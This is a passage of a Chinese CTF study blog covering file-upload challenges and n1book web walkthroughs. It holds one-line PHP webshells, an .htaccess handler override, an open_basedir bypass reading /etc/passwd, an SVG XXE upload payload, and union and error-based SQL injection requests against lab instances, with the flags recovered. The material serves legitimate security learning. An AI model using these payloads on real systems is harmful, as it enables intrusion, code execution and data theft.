class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span>   // 开启SVG标签，设置SVG文档宽度和高度</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>/&gt;</span>  // 创建圆</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span> // 闭合SVG标签</span><br></pre></td></tr></table></figure>
<h3 id="SVG-的-XSS"><a href="#SVG-的-XSS" class="headerlink" title="SVG 的 XSS"></a>SVG 的 XSS</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/434168767_99907709">https://www.sohu.com/a/434168767_99907709</a></p>
<p>原理</p>
<p>​    SVG支持通过脚本语言动态访问和修改SVG内容，类似于HTML的DOM</p>
<h2 id="BabyUpload（未做）"><a href="#BabyUpload（未做）" class="headerlink" title="BabyUpload（未做）"></a>BabyUpload（未做）</h2><p>来源：HFCTF2020</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>) <span class="comment">// 最终目标</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            safe_delete(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$direction</span> = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);  <span class="comment">// 从脚本外部获取输入 filter_input(input_type,variable,filter,options)</span></span><br><span class="line"><span class="variable">$attr</span> = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_path</span> = <span class="string">&quot;/var/babyctf/&quot;</span>.<span class="variable">$attr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$attr</span>===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_path</span> .= <span class="string">&quot;/&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$direction</span> === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_path</span> .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir(<span class="variable">$dir_path</span>, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$upload_result</span> = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$upload_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$direction</span> === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize(<span class="variable">$file_path</span>));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$download_result</span> = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$download_result</span> = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Avatar-Uploader（未做）"><a href="#Avatar-Uploader（未做）" class="headerlink" title="Avatar Uploader（未做）"></a>Avatar Uploader（未做）</h2><p>来源：HarekazeCTF2019</p>
<h2 id="getshell（未做）"><a href="#getshell（未做）" class="headerlink" title="getshell（未做）"></a>getshell（未做）</h2><p>来源：SUCTF 2019</p>
<h2 id="Upload-Labs（未做）"><a href="#Upload-Labs（未做）" class="headerlink" title="Upload Labs（未做）"></a>Upload Labs（未做）</h2><p>来源：SUCTF 2019</p>
<h2 id="Avatar-Uploader（未做）-1"><a href="#Avatar-Uploader（未做）-1" class="headerlink" title="Avatar Uploader（未做）"></a>Avatar Uploader（未做）</h2><p>来源：HarekazeCTF2019</p>
<h2 id="EzUpload（未做）"><a href="#EzUpload（未做）" class="headerlink" title="EzUpload（未做）"></a>EzUpload（未做）</h2><p>来源：D3CTF 2019</p>
<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;])?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;php&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>


<h2 id="web-server解析漏洞"><a href="#web-server解析漏洞" class="headerlink" title="web server解析漏洞"></a>web server解析漏洞</h2><p>参考：<a target="_blank" rel="noopener" href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>从右往左解析</p>
<h3 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h3><p>正常：<a target="_blank" rel="noopener" href="http://www.xxx.com/logo.jpg">www.xxx.com/logo.jpg</a><br>触发漏洞：<a target="_blank" rel="noopener" href="http://www.xxx.com/logo.asp;.jpg">www.xxx.com/logo.asp;.jpg</a><br>按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么logo.php;.jpg也会被当成PHP文件执行）   <br>b.文件夹类型<br>正常：<a target="_blank" rel="noopener" href="http://www.xxx.com/image/logo.jpg">www.xxx.com/image/logo.jpg</a><br>触发漏洞：<a target="_blank" rel="noopener" href="http://www.xxx.com/image.asp/logo.jpg">www.xxx.com/image.asp/logo.jpg</a><br>按照Ⅰ来访问logo.jpg，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问logo.jpg，文件就会被当成asp文件来处理。（如果IIS支持PHP，那么image.php文件夹下的文件也会被当做PHP文件解析。）</p>
<h3 id="IIS-7-0"><a href="#IIS-7-0" class="headerlink" title="IIS 7.0"></a>IIS 7.0</h3><p>对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>a.一个是对任意文件名，在后面添加”/任意文件名.php”的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。<br>b.低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</p>
<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>open_basedir是PHP中设置为了防御PHP跨目录文件读写的方法，本质上是一些目录的集合</p>
<p>这个命题比较大，目前只掌握了init_set的绕过方法</p>
<h3 id="init-set"><a href="#init-set" class="headerlink" title="init_set"></a>init_set</h3><p>chdir数量根据具体环境修改，<strong>一般要求是如果再chdir一次就进入根目录为止，比如php文件的位置为/www/admin/localhost_80/wwwroot/html/下,那么就要使用五次chdir(“..”);</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;tmpdir&#39;);</span><br><span class="line">chdir(&#39;tmpdir&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">$a&#x3D;file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SVG上传"><a href="#SVG上传" class="headerlink" title="SVG上传"></a>SVG上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;svgfile&quot;; filename&#x3D;&quot;1.svg&quot;</span><br><span class="line">Content-Type: image&#x2F;svf+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="ckla3x5dj0000z0ushtnr0iis" data-title="CTF-Web-文件上传" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-CTFer成长之路2-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/" class="article-date">
  <time class="dt-published" datetime="2021-02-06T07:20:33.000Z" itemprop="datePublished">2021-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/">CTF-Web-CTFer成长之路2.1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2-1-3-2-使用Gopher协议扩展攻击面"><a href="#2-1-3-2-使用Gopher协议扩展攻击面" class="headerlink" title="2.1.3.2 使用Gopher协议扩展攻击面"></a>2.1.3.2 使用Gopher协议扩展攻击面</h1><h2 id="kali搭建redis"><a href="#kali搭建redis" class="headerlink" title="kali搭建redis"></a>kali搭建redis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install redis</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/06/CTF-Web-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF2-1/" data-id="ckkw052j80000bsuscl7hcz3l" data-title="CTF-Web-CTFer成长之路2.1" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-CTFer成长之第一章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/" class="article-date">
  <time class="dt-published" datetime="2021-02-05T02:22:24.000Z" itemprop="datePublished">2021-02-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/05/CTF-wp-CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/">wp-CTFer成长之路-第一章</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="常见的搜集1"><a href="#常见的搜集1" class="headerlink" title="常见的搜集1"></a>常见的搜集1</h1><p>首先尝试/robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line">&#x2F;flag1_is_her3_fun.txt</span><br></pre></td></tr></table></figure>
<p>访问/flag1_is_her3_fun.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1:n1book&#123;info_1</span><br></pre></td></tr></table></figure>
<p>其次尝试index.php~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dd8ad7bf-b685-47dc-b67c-fbb982333f0a.node3.buuoj.cn&#x2F;index.php~</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2:s_v3ry_im</span><br></pre></td></tr></table></figure>
<p>最后尝试.index.php.swp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dd8ad7bf-b685-47dc-b67c-fbb982333f0a.node3.buuoj.cn&#x2F;.index.php.swp</span><br></pre></td></tr></table></figure>
<p>下载文件后，使用vim还原</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3:p0rtant_hack&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;info_1s_v3ry_imp0rtant_hack&#125;</span><br></pre></td></tr></table></figure>
<h2 id="index-php-swp"><a href="#index-php-swp" class="headerlink" title=".index.php.swp"></a>.index.php.swp</h2><p>vim在意外退出时生成的备份文件，.swp,.swo,.swn,.un.文件名.swp</p>
<p>恢复方法：vim -r *.swp</p>
<p>下载方法：.文件名.swp（不要忘了前置的点</p>
<h1 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h1><p>考察：githacker使用</p>
<p>环境：python3.8 kali</p>
<p>访问./git.config，有回显，说明有git泄露</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3579cc56-39ac-4136-8764-1db948d401a0.node3.buuoj.cn&#x2F;.git&#x2F;config</span><br></pre></td></tr></table></figure>
<p>使用githacker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http:&#x2F;&#x2F;3579cc56-39ac-4136-8764-1db948d401a0.node3.buuoj.cn&#x2F;.git</span><br></pre></td></tr></table></figure>
<p>得到index.php，发现flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1book&#123;git_looks_s0_easyfun&#125;</span><br></pre></td></tr></table></figure>
<h2 id="githacker"><a href="#githacker" class="headerlink" title="githacker"></a>githacker</h2><p>注意要使用git clone下载的版本</p>
<p>直接使用zip下载的版本，会无法使用</p>
<h1 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入-1"></a>SQL注入-1</h1><p>考察：union注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;1&#39; order by 4--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note</span><br><span class="line">fl4g,notes</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;fl4g&#39; --+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">fllllag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc000f9e-803c-4d05-8c21-5c486f656c71.node3.buuoj.cn&#x2F;index.php?id&#x3D;-1&#39; union select 1,2,fllllag from fl4g --+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">n1book&#123;union_select_is_so_cool&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入-2"></a>sql注入-2</h1><p>考察：报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: admin&#39; or 1&#x3D;1 --+</span><br><span class="line">pass: 1234</span><br></pre></td></tr></table></figure>
<p>账号不存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;1&amp;pass&#x3D;password</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;&#125;</span><br><span class="line">name&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#39;2&amp;pass&#x3D;password</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>根据提示，在URL后接?tips=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((database()),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line">string(28) &quot;XPATH syntax error: &#39;~note~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>此处有一个大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39; and updatexml(1,concat(0x7e,SUBSTR((sElect group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;note&#39;),1,24),0x7e),1) --+&amp;pass&#x3D;password</span><br><span class="line"></span><br><span class="line">string(34) &quot;XPATH syntax error: &#39;~fl4g,users~&#39;&quot;</span><br><span class="line">&#123;&quot;error&quot;:1,&quot;msg&quot;:&quot;\u8d26\u53f7\u4e0d\u5b58\u5728&quot;&#125;</span><br></pre></td></tr></table></figure>
